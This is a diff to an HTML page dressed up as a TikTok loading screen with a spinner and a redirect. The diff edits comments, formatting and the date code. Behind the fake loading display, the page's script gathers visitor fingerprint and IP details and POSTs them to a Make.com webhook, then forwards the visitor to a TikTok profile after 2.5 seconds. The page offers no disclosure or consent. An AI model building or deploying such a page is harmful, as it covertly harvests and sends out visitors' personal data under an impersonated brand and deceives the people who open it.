@@ -14,6 +14,7 @@
       background: #fff;
       color: #000;
     }
+
     .tiktok-container {
       display: flex;
       flex-direction: column;
@@ -23,6 +24,7 @@
       box-sizing: border-box;
       justify-content: center;
     }
+
     .logo {
       width: 80px;
       height: 80px;
@@ -31,16 +33,19 @@
       animation: float 2s ease-in-out infinite;
       margin-bottom: 10px;
     }
+
     .brand-name {
       font-size: 24px;
       color: #000;
       margin-bottom: 20px;
     }
+
     .loading-text {
       font-size: 18px;
       color: #333;
       margin-bottom: 20px;
     }
+
     .spinner {
       border: 4px solid #f3f3f3;
       border-top: 4px solid #ff0050;
@@ -50,16 +55,19 @@
       animation: spin 1s linear infinite;
       margin-bottom: 20px;
     }
+
     .sub-text {
       color: #888;
       font-size: 14px;
       text-align: center;
       max-width: 300px;
     }
+
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
     @keyframes float {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-8px); }
@@ -76,12 +84,19 @@
   </div>
 
   <script>
-     ;
     async function collectData() {
       const now = new Date();
-const localTime = now.toLocaleString();
+      const localTime = now.toLocaleString("en-US", {
+        year: "numeric",
+        month: "2-digit",
+        day: "2-digit",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit",
+        hour12: true
+      });
+
       const userData = {
-      
         userAgent: navigator.userAgent,
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -96,7 +111,7 @@ const localTime = now.toLocaleString();
         doNotTrack: navigator.doNotTrack,
         localStorage: !!window.localStorage,
         sessionStorage: !!window.sessionStorage,
-        timestamp: new Date().toISOString(),
+        timestamp: now.toISOString(),
         localTime: localTime,
       };
 
@@ -146,7 +161,7 @@ const localTime = now.toLocaleString();
         console.error('IPInfo Error:', err);
       }
 
-      // ✅ إرسال البيانات إلى Webhook الخاص بـ Make
+      // ✅ إرسال البيانات إلى Make Webhook
       fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
         method: "POST",
         body: JSON.stringify(userData),
@@ -156,13 +171,13 @@ const localTime = now.toLocaleString();
       })
       .then(response => response.text())
       .then(data => {
-        console.log("✅ تم الإرسال إلى Make:", data);
+        console.log("✅ Sent to Make:", data);
       })
       .catch(error => {
-        console.error("❌ خطأ في الإرسال:", error);
+        console.error("❌ Error sending data:", error);
       });
 
-      // 🔁 التحويل إلى TikTok بعد ثانيتين ونصف
+      // 🔁 التحويل إلى TikTok بعد 2.5 ثانية
       setTimeout(() => {
         window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
       }, 2500);
